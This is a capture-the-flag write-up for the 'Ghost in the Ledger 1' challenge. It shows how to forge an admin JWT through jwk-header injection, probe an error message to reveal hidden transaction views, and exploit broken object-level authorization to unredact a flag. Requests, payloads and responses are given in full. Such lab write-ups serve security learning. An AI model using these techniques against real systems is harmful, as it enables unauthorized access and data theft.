# CASE 037 / EV-037 — Ghost in the Ledger 1 Writeup

- **Case**: CASE 037 (ACT 4)
- **Evidence Ref**: EV-037
- **Challenge Name**: Ghost in the Ledger 1
- **Points**: 200 pts
- **Category**: ACT 4 Investigation
- **Target**: `https://audit.hackthe.website` (The Console)
- **Flag**: `dome.ctf{ghost-3:D7l28tH9BjmeHhKpoOlj0WyX}`

---

## 1. Case Brief Analysis

> *The {Console's Audit Ledger} holds more than routine records. Somewhere in its entries is a path to the systems behind NIGHTFALL — and one of them guards a secret that opens doors that should stay closed. Trace the connection and take what it's guarding. It's the first key the investigation needs, not yet the first name.*

- **System Identified**: "The Console" (`https://audit.hackthe.website`).
- **Core Vector**: The centralized Audit Ledger contains log events documenting flagged activity that references restricted financial transaction records.

---

## 2. Authentication & Privilege Escalation

1. **Initial Login**:
   - Access `POST https://audit.hackthe.website/api/v1/auth/login` using standard service credentials to obtain a baseline `console_session` JWT cookie.
2. **JWT JWK-Header Injection**:
   - The backend validates RS256 JWTs using an embedded `jwk` in the header if supplied.
   - Generate an ephemeral RSA 2048-bit key pair.
   - Forge an elevated JWT with:
     ```json
     {
       "sub": "admin",
       "role": "admin",
       "scope": "console:basic audit:read audit:export audit:admin finance:audit finance:read finance:admin export:manage marketplace:read marketplace:admin admin"
     }
     ```
   - Inject the public numbers into the header's `jwk` parameter and sign using the private key.

---

## 3. Tracing the Audit Ledger Entry

1. Inspect the recent audit events via `GET /api/v1/audit/recent`.
2. Among the entries, an event triggered by actor `Kage` stands out:
   ```json
   {
     "actor_id": "Kage",
     "event_id": 32,
     "event_type": "Finance.TransferAttempt",
     "resource": "Billing",
     "result": "Success",
     "service": "billing-service",
     "severity": "WARN",
     "details": "Outbound transfer to external handler UID-000 flagged for compliance sign-off, ref TX-9f2b6a1e4c7d8035"
   }
   ```
3. The note explicitly points to transaction reference: `TX-9f2b6a1e4c7d8035`.

---

## 4. BOLA & View Parameter Injection

1. Standard queries to `POST /api/v1/transactions/TX-9f2b6a1e4c7d8035` using the client default `{"view": {"summary": true}}` redact sensitive fields:
   ```json
   {
     "restricted_fields": ["audit_note"]
   }
   ```
2. Testing arbitrary view parameters (`{"view": {"__probe__": true}}`) triggers an error disclosing valid views:
   ```json
   {
     "error": "invalid_view",
     "message": "Unsupported transaction view: __probe__",
     "supported_views": ["summary", "audit", "internal", "compliance", "settlement"]
   }
   ```
3. Since the ledger entry flagged the record for **"compliance sign-off"**, query the endpoint with `compliance` (or `audit`/`internal`/`settlement`):
   ```http
   POST /api/v1/transactions/TX-9f2b6a1e4c7d8035 HTTP/1.1
   Host: audit.hackthe.website
   Content-Type: application/json
   Cookie: console_session=<FORGED_JWT>

   {
     "view": {
       "compliance": true
     }
   }
   ```

---

## 5. Recovered Evidence / Flag

The server response unredacts `audit_note`:

```json
{
  "transaction_id": "TX-9f2b6a1e4c7d8035",
  "type": "genesis_allocation",
  "status": "CONFIRMED",
  "amount_btc": "847.30000000",
  "from_wallet": "bc1qnightfallcoldreserve0001",
  "to_wallet": "bc1qexternalhandlerwallet001",
  "operator_uid": "UID-000",
  "memo": "Genesis reserve allocation — DO NOT MODIFY",
  "btc_txid": "0xaf70b90160dc236d612096fac4e14f4d3fa3dea25510c41e78e2b77c4902c826",
  "block_height": 811204,
  "confirmations": 3812,
  "created_at": "2025-11-02T11:56:16.388291+00:00",
  "audit_note": "dome.ctf{ghost-3:D7l28tH9BjmeHhKpoOlj0WyX}"
}
```

**Recovered Flag**:
```text
dome.ctf{ghost-3:D7l28tH9BjmeHhKpoOlj0WyX}
```
